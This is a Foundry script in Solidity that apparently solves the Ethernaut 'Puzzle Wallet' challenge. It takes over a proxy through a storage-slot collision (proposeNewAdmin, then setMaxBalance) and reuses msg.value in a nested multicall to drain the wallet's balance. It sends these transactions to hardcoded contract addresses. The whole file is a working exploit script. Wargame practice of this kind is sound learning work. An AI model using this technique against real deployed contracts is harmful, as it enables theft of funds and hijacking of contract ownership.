// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../src/PuzzleWallet.sol";
import {Script} from "forge-std/Script.sol";

contract PuzzleWalletAttack is Script {
    PuzzleWallet public puzzleWallet = PuzzleWallet(payable(0x6A192a14dbd7e3e5Bf67f091aB39D6245c409ddf));
    PuzzleProxy public puzzleProxy = PuzzleProxy(payable(0x0d89A2cF96d358f07921082D2e0020D16e940A81));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes[] memory depositSelector = new bytes[](1);
        bytes[] memory nestedMulticall = new bytes[](2);

        depositSelector[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        nestedMulticall[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositSelector);

        puzzleProxy.proposeNewAdmin(vm.envAddress("MY_ADDRESS"));
        puzzleWallet.addToWhitelist(vm.envAddress("MY_ADDRESS"));

        puzzleWallet.multicall{value: 0.001 ether}(nestedMulticall);
        puzzleWallet.execute(vm.envAddress("MY_ADDRESS"), 0.002 ether, "");

        puzzleWallet.setMaxBalance(uint256(uint160(vm.envAddress("MY_ADDRESS"))));

        vm.stopBroadcast();
    }
}